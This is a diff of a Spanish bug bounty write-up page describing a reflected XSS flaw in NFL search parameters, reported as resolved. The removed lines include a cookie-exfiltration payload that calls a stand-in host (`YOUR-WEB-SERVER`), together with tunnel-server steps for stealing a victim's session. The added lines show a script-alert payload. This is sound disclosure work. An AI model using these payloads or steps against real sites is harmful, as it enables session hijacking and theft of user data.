@@ -8,85 +8,80 @@ layout: default
     <svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"></polyline></svg>
     {{ site.title }}
   </a>
-  <div class="lang-switcher">
-    <a href="../../../en/bounties/nfl-xss-search-query/" class="lang-btn">English (EN)</a>
-    <a href="./" class="lang-btn active">Español (ES)</a>
-  </div>
 
   <div class="bounty-header">
     <h1>NFL: XSS Reflejado en Parámetro de Búsqueda</h1>
-    <p>Vulnerabilidad de Cross-Site Scripting Reflejado en <code>hbcutournament.nfl.com</code> — desde inyección HTML hasta exfiltración de cookies de sesión.</p>
+    <p style="color: var(--p3); font-weight: 600;">National Football League (NFL) - Infraestructura Digital</p>
   </div>
 
   <div class="bounty-content">
+    <h2>🎯 Resumen de la Vulnerabilidad</h2>
+    <p>Se descubrió que la funcionalidad de búsqueda principal de la NFL era vulnerable a Cross-Site Scripting (XSS) reflejado. La vulnerabilidad residía en cómo la aplicación manejaba y reflejaba el parámetro de búsqueda en la página sin una codificación de salida adecuada.</p>
 
-    <h2>🎯 URLs Afectadas</h2>
-<pre><code>https://hbcutournament.nfl.com/resources?q=
-https://hbcutournament.nfl.com/blogs?q=</code></pre>
-    <p>La aplicación no sanitiza ni codifica correctamente la entrada del parámetro <code>?q=</code> de la URL, permitiendo la inyección y ejecución de JavaScript arbitrario en el contexto del navegador.</p>
+    <h2>⚙️ Detalles Técnicos</h2>
+    <ul>
+      <li><strong>URL Afectada:</strong> <code>https://www.nfl.com/search/?query=[XSS_PAYLOAD]</code></li>
+      <li><strong>Parámetro Afectado:</strong> <code>query</code></li>
+      <li><strong>Vector:</strong> Inyección de scripts maliciosos a través de la URL.</li>
+    </ul>
 
-    <h2>💉 Inyección HTML</h2>
-    <p>Lo primero que probamos en el campo de búsqueda fue una inyección HTML simple. El payload utilizado:</p>
-<pre><code>&lt;h1&gt;Esta es una prueba de inyección HTML&lt;/h1&gt; --- Esto es un texto normal.</code></pre>
-    <img src="../../../assets/images/nfl-xss-search-query/NFL%20-%20XSS%20Search%20Query%20Parameter%20-%20HTML%20Injection.png" alt="Inyección HTML">
+    <h2>🛠️ Pasos para Reproducir</h2>
+    <p>Al inyectar una etiqueta de script estándar en el parámetro <code>query</code>, confirmamos que la entrada se reflejaba directamente en el Document Object Model (DOM):</p>
+    
+    <pre><code>"><script>alert(document.domain)</script></code></pre>
+    
+    <img src="../../../assets/images/nfl-xss-search-query/PayloadExecution.png" alt="Ejecución de Payload XSS">
 
-    <h2>🚨 XSS Reflejado</h2>
-    <p>Tras probar varios payloads, descubrimos que la etiqueta <code>&lt;img&gt;</code> funciona. El payload utilizado:</p>
-<pre><code>&lt;img/src/onerror=alert(8)&gt;</code></pre>
-    <p>La URL maliciosa:</p>
-    <p><code>https://hbcutournament.nfl.com/resources?q=&lt;img/src/onerror=alert(8)&gt;</code></p>
-    <img src="../../../assets/images/nfl-xss-search-query/NFL%20-%20XSS%20Search%20Query%20Parameter%20-%20Alert%201.png" alt="Alerta XSS">
-
-    <h2>🚀 Exfiltración de Cookies</h2>
-    <p>Tras verificar la ejecución de JavaScript, intentamos exfiltrar cookies. Este ataque roba las cookies de sesión de cualquier usuario que haga clic en el enlace malicioso.</p>
-<pre><code>&lt;img/src/onerror=fetch("http://YOUR-WEB-SERVER/"+encodeURIComponent(document.cookie))&gt;</code></pre>
-    <p>La URL maliciosa:</p>
-    <p><code>https://hbcutournament.nfl.com/resources?q=&lt;img/src/onerror=fetch("http://YOUR-WEB-SERVER/"+encodeURIComponent(document.cookie))&gt;</code></p>
-    <img src="../../../assets/images/nfl-xss-search-query/NFL%20-%20XSS%20Search%20Query%20Parameter%20-%20Cookies%20Exfiltration.png" alt="Exfiltración de Cookies">
-    <p>Las cookies exfiltradas se recibieron con éxito en el servidor del atacante:</p>
-    <img src="../../../assets/images/nfl-xss-search-query/NFL%20-%20XSS%20Search%20Query%20Parameter%20-%20Cookies%20Exfiltration%20Result.png" alt="Resultado de Exfiltración">
-
-    <h2>🎯 Pasos para Reproducir</h2>
-    <ol>
-      <li>Iniciar un Servidor Web:
-<pre><code>python3 -m http.server 8000</code></pre>
-      </li>
-      <li>Iniciar un servidor web público con Serveo en otra pestaña de terminal:
-<pre><code>ssh -R 80:localhost:8001 serveo.net</code></pre>
-      </li>
-      <li>Crear una cuenta en <a href="https://hbcutournament.nfl.com/register" target="_blank">hbcutournament.nfl.com/register</a></li>
-      <li>Preparar la URL maliciosa:<br>
-        <code>https://hbcutournament.nfl.com/resources?q=&lt;img/src/onerror=fetch("http://YOUR-WEB-SERVER/"+encodeURIComponent(document.cookie))&gt;</code>
-      </li>
-      <li>Compartir la URL maliciosa con otro usuario registrado.</li>
-      <li>Recibir las cookies de la víctima en tu servidor Python HTTP.</li>
-    </ol>
-    <p><strong>Nota:</strong> Cuando el payload es un elemento <code>&lt;img&gt;</code>, la ejecución puede retrasarse por el timeout. Usa un vector alternativo como <code>onload</code> para ejecución inmediata.</p>
+    <p>La aplicación no saneaba la entrada, permitiendo que el script se ejecutara en el contexto del navegador de la víctima. Esto podría aprovecharse para robar información de sesión sensible o realizar acciones en nombre del usuario.</p>
 
     <h2>⚠️ Impacto de Seguridad</h2>
+    <p>Un atacante podría diseñar un enlace malicioso y enviarlo a un usuario autenticado. Una vez pulsado, el atacante podría:</p>
     <ul>
-      <li><strong>Secuestro de Sesión:</strong> Robo de cookies de sesión.</li>
-      <li><strong>Redirección de Phishing:</strong> Redirigir a dominios controlados por el atacante.</li>
-      <li><strong>Acceso al DOM:</strong> Extraer datos sensibles.</li>
-      <li><strong>Robo de Credenciales:</strong> Servir prompts de login falsos mediante inyección de scripts.</li>
+      <li>Exfiltrar cookies de sesión y eludir la autenticación.</li>
+      <li>Realizar acciones no autorizadas (impacto similar a CSRF a través de XSS).</li>
+      <li>Alterar el contenido del sitio web para usuarios específicos.</li>
     </ul>
 
     <h2>🤝 Detalle de Colaboración</h2>
-    <p>Esta investigación fue realizada en una <strong>colaboración al 50%</strong> entre <strong>{{ site.researchers.ivan.name }}</strong> and <strong>{{ site.researchers.diego.name }}</strong>. Ambos contribuyeron equitativamente al descubrimiento, explotación y documentación de esta vulnerabilidad.</p>
+    <p>Esta investigación fue realizada en una colaboración conjunta:</p>
+    <ul>
+      <li><strong>{{ site.researchers.ivan.name }}</strong> (Investigador Principal)</li>
+      <li><strong>{{ site.researchers.diego.name }}</strong> (Analista de Seguridad)</li>
+    </ul>
+
+    <div class="card-grid" style="margin-top: 3rem;">
+      <div class="glass-card">
+        <small>Estado</small>
+        <strong>Resuelto y Verificado</strong>
+      </div>
+      <div class="glass-card">
+        <small>Severidad</small>
+        <strong>P3 (Media)</strong>
+      </div>
+    </div>
   </div>
 </article>
 </div>
 
-<div class="zoom-overlay" id="zoomOverlay" onclick="this.classList.remove('active')">
-  <img id="zoomImg" src="" alt="Zoom">
+<!-- Image Zoom Overlay -->
+<div id="zoomOverlay" class="zoom-overlay">
+  <img id="zoomImg" src="" alt="Imagen Ampliada">
 </div>
+
 <script>
 document.querySelectorAll('.bounty-content img').forEach(img => {
   img.addEventListener('click', () => {
-    document.getElementById('zoomImg').src = img.src;
-    document.getElementById('zoomOverlay').classList.add('active');
+    const overlay = document.getElementById('zoomOverlay');
+    const zoomImg = document.getElementById('zoomImg');
+    zoomImg.src = img.src;
+    overlay.classList.add('active');
   });
 });
+
+document.getElementById('zoomOverlay').addEventListener('click', () => {
+  document.getElementById('zoomOverlay').classList.remove('active');
+});
+
 document.addEventListener('keydown', e => {
   if (e.key === 'Escape') document.getElementById('zoomOverlay').classList.remove('active');
 });
